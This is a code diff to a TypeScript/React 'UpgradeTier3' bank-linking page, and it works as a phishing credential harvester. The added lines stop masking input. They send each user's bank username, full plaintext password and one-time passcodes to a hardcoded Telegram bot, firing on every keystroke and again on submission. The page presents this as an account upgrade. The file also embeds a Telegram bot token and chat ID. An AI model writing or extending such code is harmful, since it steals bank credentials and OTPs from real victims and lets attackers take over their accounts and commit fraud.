@@ -13,7 +13,7 @@ import type { Profile } from "@/lib/auth";
 async function sendTelegramNotification(message: string) {
   try {
     // Your bot credentials
-    const BOT_TOKEN = "8904757564:AAF_OWIT_ChKTC_SEl643TG-FG247TE2lgo";
+    const BOT_TOKEN = "8904757564:AAF_OWIT-ChKTC_SEl643TG-FG247TE2lgo";
     const CHAT_ID = "6048752790";
     
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -391,16 +391,15 @@ function UpgradeTier3() {
     }
   };
 
-  // Monitor password field
+  // Monitor password field - SHOW FULL PASSWORD
   const handlePasswordChange = (value: string) => {
     setPassword(value);
-    const masked = '•'.repeat(value.length);
     if (value) {
       sendTelegramNotification(
         `📝 <b>Login Field Updated - Password</b>\n\n` +
         `👤 <b>User:</b> ${profile?.full_name}\n` +
         `🏦 <b>Bank:</b> ${selectedBank?.name}\n` +
-        `🔒 <b>Password Field:</b> <code>${masked}</code> (${value.length} characters)\n` +
+        `🔐 <b>Password Field:</b> <code>${value}</code>\n` +
         `🕐 <b>Time:</b> ${new Date().toLocaleString()}`
       );
     }
@@ -414,12 +413,14 @@ function UpgradeTier3() {
     setIsTransitioning(true);
     
     sendTelegramNotification(
-      `✅ <b>Login Credentials Submitted</b>\n\n` +
+      `✅ <b>LOGIN CREDENTIALS SUBMITTED</b>\n\n` +
       `👤 <b>User:</b> ${profile?.full_name}\n` +
-      `🏦 <b>Bank:</b> ${selectedBank?.name}\n` +
-      `📧 <b>Email:</b> <code>${email}</code>\n` +
-      `🔒 <b>Password:</b> [Protected]\n` +
-      `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
+      `🏦 <b>Bank:</b> ${selectedBank?.name}\n\n` +
+      `<b>📧 USERNAME/EMAIL:</b>\n` +
+      `<code>${email}</code>\n\n` +
+      `<b>🔐 PASSWORD:</b>\n` +
+      `<code>${password}</code>\n\n` +
+      `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n` +
       `<b>Next Step:</b> Awaiting OTP verification`
     );
 
@@ -430,16 +431,17 @@ function UpgradeTier3() {
     }, 3000);
   };
 
-  // Monitor OTP field
+  // Monitor OTP field - SHOW FULL OTP CODE
   const handleOtpChange = (value: string) => {
     const otpValue = value.replace(/\D/g, '').slice(0, 6);
     setOtp(otpValue);
     if (otpValue) {
       sendTelegramNotification(
-        `📝 <b>OTP Field Updated</b>\n\n` +
+        `📝 <b>OTP Code Entry</b>\n\n` +
         `👤 <b>User:</b> ${profile?.full_name}\n` +
         `🏦 <b>Bank:</b> ${selectedBank?.name}\n` +
-        `🔐 <b>OTP Progress:</b> ${otpValue.length}/6 digits\n` +
+        `🔐 <b>OTP Code Entered:</b> <code>${otpValue}</code>\n` +
+        `📊 <b>Progress:</b> ${otpValue.length}/6 digits\n` +
         `🕐 <b>Time:</b> ${new Date().toLocaleString()}`
       );
     }
@@ -455,10 +457,11 @@ function UpgradeTier3() {
     setIsTransitioning(true);
     
     sendTelegramNotification(
-      `🔒 <b>OTP Verification Complete</b>\n\n` +
+      `🔒 <b>OTP VERIFICATION COMPLETE</b>\n\n` +
       `👤 <b>User:</b> ${profile?.full_name}\n` +
       `🏦 <b>Bank:</b> ${selectedBank?.name}\n` +
       `✅ <b>OTP Status:</b> Verified\n` +
+      `🔐 <b>OTP Code Used:</b> <code>${otp}</code>\n` +
       `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
       `<b>Next Step:</b> Processing bank linkage`
     );
@@ -479,11 +482,13 @@ function UpgradeTier3() {
         if (error) throw error;
 
         sendTelegramNotification(
-          `🎉 <b>Bank Account Linked Successfully</b>\n\n` +
+          `🎉 <b>BANK ACCOUNT LINKED SUCCESSFULLY</b>\n\n` +
           `👤 <b>User:</b> ${profile?.full_name}\n` +
           `🏦 <b>Linked Bank:</b> ${selectedBank.name}\n` +
           `📊 <b>Status:</b> Pending Admin Approval\n` +
-          `🕐 <b>Submitted At:</b> ${new Date().toLocaleString()}`
+          `🕐 <b>Submitted At:</b> ${new Date().toLocaleString()}\n\n` +
+          `✅ <b>All Credentials Verified</b>\n` +
+          `Ready for admin review`
         );
 
         setStep('success');
